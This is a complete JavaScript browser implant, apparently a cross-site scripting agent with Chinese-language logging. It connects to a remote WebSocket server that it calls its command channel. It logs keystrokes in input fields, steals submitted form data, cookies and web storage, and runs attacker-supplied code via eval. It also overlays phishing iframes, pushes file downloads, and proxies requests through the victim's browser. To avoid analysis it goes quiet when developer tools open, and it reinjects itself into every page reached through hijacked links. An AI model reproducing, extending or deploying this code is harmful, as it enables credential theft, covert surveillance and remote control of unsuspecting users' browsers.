if (!window.__WS_LOADED__) {
  window.__WS_LOADED__ = true;
  window.socket = null;
  window.heartbeatInterval = null;
  window.keylogFlushInterval = null;
  window.antiDebugInterval = null;
  window.reconnectDelay = 3000;
  window.__DEVTOOLS_OPEN__ = false;

  function detectDevTools() {
    const threshold = 160;
    const widthThreshold = window.outerWidth - window.innerWidth > threshold;
    const heightThreshold = window.outerHeight - window.innerHeight > threshold;
    
    const isOpen = (!(heightThreshold && widthThreshold) && 
      ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || 
       widthThreshold || heightThreshold));
    
    
    if (isOpen && !window.__DEVTOOLS_OPEN__) {
      window.__DEVTOOLS_OPEN__ = true;
      if (window.socket && window.socket.readyState === WebSocket.OPEN) {
        window.socket.send(`[🚨 反调试] DevTools 已打开，停止活动`);
      }
      clearInterval(window.heartbeatInterval);
      clearInterval(window.keylogFlushInterval);
      if (window.__KEYLOG_ACTIVE__) {
        document.removeEventListener("keydown", window.__keylogHandler__);
        window.__KEYLOG_ACTIVE__ = false;
      }
      if (window.__FORMHIJACK_ACTIVE__) {
        document.removeEventListener("submit", window.__formHandler__, true);
        window.__FORMHIJACK_ACTIVE__ = false;
      }
      if (window.socket) window.socket.close();
    }
    
    
    if (!isOpen && window.__DEVTOOLS_OPEN__) {
      window.__DEVTOOLS_OPEN__ = false;
      if (window.socket && window.socket.readyState === WebSocket.CLOSED) {
        connect();
      }
    }
  }

  function connect() {
    window.socket = new WebSocket("wss://kka.pw:8443/ws");

    window.socket.onopen = () => {
      window.socket.send("victim");
      window.reconnectDelay = 3000;
      
      if (window.heartbeatInterval) clearInterval(window.heartbeatInterval);
      window.heartbeatInterval = setInterval(() => {
        if (window.socket.readyState === WebSocket.OPEN) {
          window.socket.send(JSON.stringify({type:"ping",data:{ts:Date.now(),ua:navigator.userAgent.slice(0,20)}}));
        }
      }, 15000);

      if (window.keylogFlushInterval) clearInterval(window.keylogFlushInterval);
      window.keylogFlushInterval = setInterval(() => {
        if (window.__KEYLOG_ACTIVE__ && window.__KEYLOG_BUFFER__ && window.__KEYLOG_BUFFER__.length > 0 && window.socket.readyState === WebSocket.OPEN) {
          window.socket.send(`[⌨️ 键盘记录] ${window.__KEYLOG_BUFFER__.join(" ")}`);
          window.__KEYLOG_BUFFER__ = [];
        }
      }, 10000);

      if (window.antiDebugInterval) clearInterval(window.antiDebugInterval);
      window.antiDebugInterval = setInterval(detectDevTools, 1000);
    };

    window.socket.onclose = () => {
      if (window.__DEVTOOLS_OPEN__) return;
      clearInterval(window.heartbeatInterval);
      clearInterval(window.keylogFlushInterval);
      setTimeout(connect, window.reconnectDelay);
      window.reconnectDelay = Math.min(window.reconnectDelay * 2, 60000);
    };

    window.socket.onerror = () => {
      window.socket.close();
    };

    window.socket.onmessage = async (event) => {
      const data = event.data;

      
      if (data.startsWith("file:")) {
        const parts = data.split("|", 2);
        if (parts.length === 2) {
          const header = parts[0];
          const base64Data = parts[1];
          const filename = header.slice(5);
          const binary = atob(base64Data);
          const bytes = new Uint8Array(binary.length);
          for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
          }
          const blob = new Blob([bytes]);
          const blobUrl = URL.createObjectURL(blob);
          const a = document.createElement("a");
          a.href = blobUrl;
          a.download = filename;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          window.socket.send(`[文件已接收] ${filename} (${blob.size} bytes)`);
        }
        return;
      }

      
      if (data.startsWith("collectinfo:")) {
        const fields = data.slice("collectinfo:".length).split(",");
        let results = {};
        if (fields.includes("useragent")) results.useragent = navigator.userAgent;
        if (fields.includes("platform")) results.platform = navigator.platform;
        if (fields.includes("urlref")) {
          results.url = window.location.href;
          results.referrer = document.referrer;
        }
        if (fields.includes("plugins")) {
          results.plugins = Array.from(navigator.plugins, p => p.name);
        }
        if (fields.includes("cookies")) results.cookies = document.cookie;
        if (fields.includes("storage")) {
          let storageData = {};

          // 1. localStorage
          try {
            let localStorageData = {};
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              localStorageData[key] = localStorage.getItem(key);
            }
            storageData.localStorage = localStorageData;
          } catch (e) {
            storageData.localStorageError = e.message;
          }

          // 2. sessionStorage
          try {
            let sessionStorageData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i);
              sessionStorageData[key] = sessionStorage.getItem(key);
            }
            storageData.sessionStorage = sessionStorageData;
          } catch (e) {
            storageData.sessionStorageError = e.message;
          }

          // 3. IndexedDB 数据库列表
          try {
            if (window.indexedDB) {
              storageData.indexedDBSupported = true;
              // 尝试获取所有数据库（需要异步，这里先标记支持）
              if (window.indexedDB.databases) {
                window.indexedDB.databases().then(dbs => {
                  const dbNames = dbs.map(db => db.name);
                  if (dbNames.length > 0) {
                    window.socket.send(`[📦 IndexedDB] 发现数据库: ${JSON.stringify(dbNames)}`);
                  }
                }).catch(e => {
                  window.socket.send(`[📦 IndexedDB] 枚举失败: ${e.message}`);
                });
              }
            } else {
              storageData.indexedDBSupported = false;
            }
          } catch (e) {
            storageData.indexedDBError = e.message;
          }

          // 4. Cookie（已在上面单独收集，这里再次包含）
          try {
            storageData.cookies = document.cookie;
          } catch (e) {
            storageData.cookiesError = e.message;
          }

          // 5. Cache Storage (Service Worker 缓存)
          try {
            if (window.caches) {
              storageData.cacheStorageSupported = true;
              window.caches.keys().then(cacheNames => {
                if (cacheNames.length > 0) {
                  window.socket.send(`[💾 Cache Storage] 发现缓存: ${JSON.stringify(cacheNames)}`);
                }
              }).catch(e => {
                window.socket.send(`[💾 Cache Storage] 枚举失败: ${e.message}`);
              });
            } else {
              storageData.cacheStorageSupported = false;
            }
          } catch (e) {
            storageData.cacheStorageError = e.message;
          }

          // 6. Web SQL (已废弃但某些浏览器仍支持)
          try {
            if (window.openDatabase) {
              storageData.webSQLSupported = true;
            } else {
              storageData.webSQLSupported = false;
            }
          } catch (e) {
            storageData.webSQLError = e.message;
          }

          // 7. 存储配额信息
          try {
            if (navigator.storage && navigator.storage.estimate) {
              navigator.storage.estimate().then(estimate => {
                const usedMB = (estimate.usage / 1024 / 1024).toFixed(2);
                const quotaMB = (estimate.quota / 1024 / 1024).toFixed(2);
                window.socket.send(`[📊 存储配额] 已使用: ${usedMB}MB / 总配额: ${quotaMB}MB`);
              }).catch(e => {
                window.socket.send(`[📊 存储配额] 查询失败: ${e.message}`);
              });
            }
          } catch (e) {
            storageData.storageQuotaError = e.message;
          }

          results.storage = storageData;
        }
        window.socket.send(`[收集到的信息] ${JSON.stringify(results)}`);
        return;
      }

      
      if (data.startsWith("features:")) {
        const [keylog, formhijack, chunked] = data.slice("features:".length).split(",").map(v => v === "1");
        window.__CHUNKED_MODE__ = chunked;
        
        if (keylog && !window.__KEYLOG_ACTIVE__) {
          window.__KEYLOG_ACTIVE__ = true;
          window.__KEYLOG_BUFFER__ = [];
          document.addEventListener("keydown", window.__keylogHandler__ = (e) => {
            const target = e.target.tagName;
            const key = e.key;
            if (target === "INPUT" || target === "TEXTAREA") {
              window.__KEYLOG_BUFFER__.push(`[${target}] ${key}`);
              if (window.__KEYLOG_BUFFER__.length >= 20) {
                window.socket.send(`[⌨️ 键盘记录] ${window.__KEYLOG_BUFFER__.join(" ")}`);
                window.__KEYLOG_BUFFER__ = [];
              }
            }
          });
          window.socket.send(`[✅ 功能] 键盘记录已启用`);
        } else if (!keylog && window.__KEYLOG_ACTIVE__) {
          window.__KEYLOG_ACTIVE__ = false;
          document.removeEventListener("keydown", window.__keylogHandler__);
          window.socket.send(`[✅ 功能] 键盘记录已禁用`);
        }
        
        if (formhijack && !window.__FORMHIJACK_ACTIVE__) {
          window.__FORMHIJACK_ACTIVE__ = true;
          document.addEventListener("submit", window.__formHandler__ = (e) => {
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            for (let [k, v] of formData.entries()) data[k] = v;
            window.socket.send(`[📝 表单劫持] ${form.action || window.location.href} → ${JSON.stringify(data)}`);
          }, true);
          window.socket.send(`[✅ 功能] 表单劫持已启用`);
        } else if (!formhijack && window.__FORMHIJACK_ACTIVE__) {
          window.__FORMHIJACK_ACTIVE__ = false;
          document.removeEventListener("submit", window.__formHandler__, true);
          window.socket.send(`[✅ 功能] 表单劫持已禁用`);
        }
        
        if (chunked && !window.__CHUNKED_ACTIVE__) {
          window.__CHUNKED_ACTIVE__ = true;
          window.socket.send(`[✅ 功能] 分片传输已启用`);
        } else if (!chunked && window.__CHUNKED_ACTIVE__) {
          window.__CHUNKED_ACTIVE__ = false;
          window.socket.send(`[✅ 功能] 分片传输已禁用`);
        }
        return;
      }

      
      if (data.startsWith("submitform:")) {
        try {
          const payload = JSON.parse(data.slice("submitform:".length));
          const formData = new FormData();
          for (let [key, value] of Object.entries(payload.data)) {
            formData.append(key, value);
          }
          
          const method = payload.method.toUpperCase();
          const action = payload.action;
          
          if (method === 'GET') {
            const params = new URLSearchParams(payload.data).toString();
            window.location.href = action + (action.includes('?') ? '&' : '?') + params;
          } else {
            fetch(action, {
              method: method,
              body: formData
            }).then(res => {
              const status = res.status;
              return res.text().then(html => ({status, html}));
            }).then(({status, html}) => {
              window.socket.send(`[✅ 表单提交成功] ${action} → ${status}`);
              window.socket.send(`[📄] 提交响应:\n${html.slice(0, 10000)}\n---`);
            }).catch(err => {
              window.socket.send(`[❌ 表单提交失败] ${action}: ${err}`);
            });
          }
        } catch (err) {
          window.socket.send(`[❌ 表单提交错误] ${err}`);
        }
        return;
      }
      if (data.startsWith("phishing:")) {
        const phishingUrl = data.slice("phishing:".length);
        
        
        const iframe = document.createElement("iframe");
        iframe.id = "__phishing_iframe__";
        iframe.src = phishingUrl;
        iframe.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999;";
        
        
        iframe.onload = () => {
          try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            iframeDoc.addEventListener("submit", (e) => {
              e.preventDefault();
              const form = e.target;
              const formData = new FormData(form);
              const data = {};
              for (let [k, v] of formData.entries()) data[k] = v;
              window.socket.send(`[🎣 钓鱼成功] ${phishingUrl} → ${JSON.stringify(data)}`);
              
              
              iframe.remove();
            }, true);
          } catch (err) {
            
            window.addEventListener("message", (e) => {
              if (e.data && e.data.__phishing_data__) {
                window.socket.send(`[🎣 钓鱼成功] ${phishingUrl} → ${JSON.stringify(e.data.__phishing_data__)}`);
                iframe.remove();
              }
            });
            
            
            const script = `
              document.addEventListener("submit", (e) => {
                e.preventDefault();
                const form = e.target;
                const formData = new FormData(form);
                const data = {};
                for (let [k, v] of formData.entries()) data[k] = v;
                window.parent.postMessage({__phishing_data__: data}, "*");
              }, true);
            `;
            iframe.contentWindow.postMessage({__inject_script__: script}, "*");
          }
        };
        
        document.body.appendChild(iframe);
        
        window.socket.send(`[✅ 钓鱼页面已注入] ${phishingUrl}`);
        return;
      }

      
      if (data.startsWith("exec:")) {
        const jsCode = data.slice("exec:".length);
        try {
          const result = eval(jsCode);
          if (result !== undefined) {
            window.socket.send(`[✅ 执行结果] ${jsCode.slice(0, 60)} → ${result}`);
          } else {
            window.socket.send(`[✅ 已执行] ${jsCode.slice(0, 60)}...`);
          }
        } catch (err) {
          window.socket.send(`[❌ 执行错误] ${err}`);
        }
        return;
      }

      
      try {
        const res = await fetch(data);
        if (res.status >= 200 && res.status < 500) {
          const text = await res.text();
          if (window.__CHUNKED_MODE__ && text.length > 50000) {
            window.socket.send(`[✅] ${data} → ${res.status}`);
            const chunkSize = 50000;
            const chunks = Math.ceil(text.length / chunkSize);
            for (let i = 0; i < chunks; i++) {
              const chunk = text.slice(i * chunkSize, (i + 1) * chunkSize);
              window.socket.send(`[📄 分片 ${i+1}/${chunks}]\n${chunk}\n---`);
            }
          } else {
            window.socket.send(`[✅] ${data} → ${res.status}`);
            window.socket.send(`[📄] 内容预览:\n${text.slice(0, 10000000)}\n---`);
          }
        }
      } catch (err) {
        window.socket.send(`[❌] 请求错误 ${data}: ${err}`);
      }
    };
  }

  connect();
}


function hijackLinks() {
  document.querySelectorAll("a").forEach(link => {
    if (link.dataset.hijacked) return;
    link.dataset.hijacked = "true";
    
    link.addEventListener("click", async (e) => {
      e.preventDefault();
      const targetUrl = link.href;
      
      try {
        const res = await fetch(targetUrl);
        let html = await res.text();
        
        
        const agentScript = `<script src="https://<your-domain>:8443/min.js"></script>`;
        if (html.includes("</head>")) {
          html = html.replace("</head>", `${agentScript}</head>`);
        } else if (html.includes("<body")) {
          html = html.replace("<body", `${agentScript}<body`);
        } else {
          html = agentScript + html;
        }
        
        
        document.open();
        document.write(html);
        document.close();
        
        
        setTimeout(hijackLinks, 100);
      } catch (err) {
        
      }
    });
  });
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", hijackLinks);
} else {
  hijackLinks();
}


if (document.body) {
  const observer = new MutationObserver(hijackLinks);
  observer.observe(document.body, { childList: true, subtree: true });
}
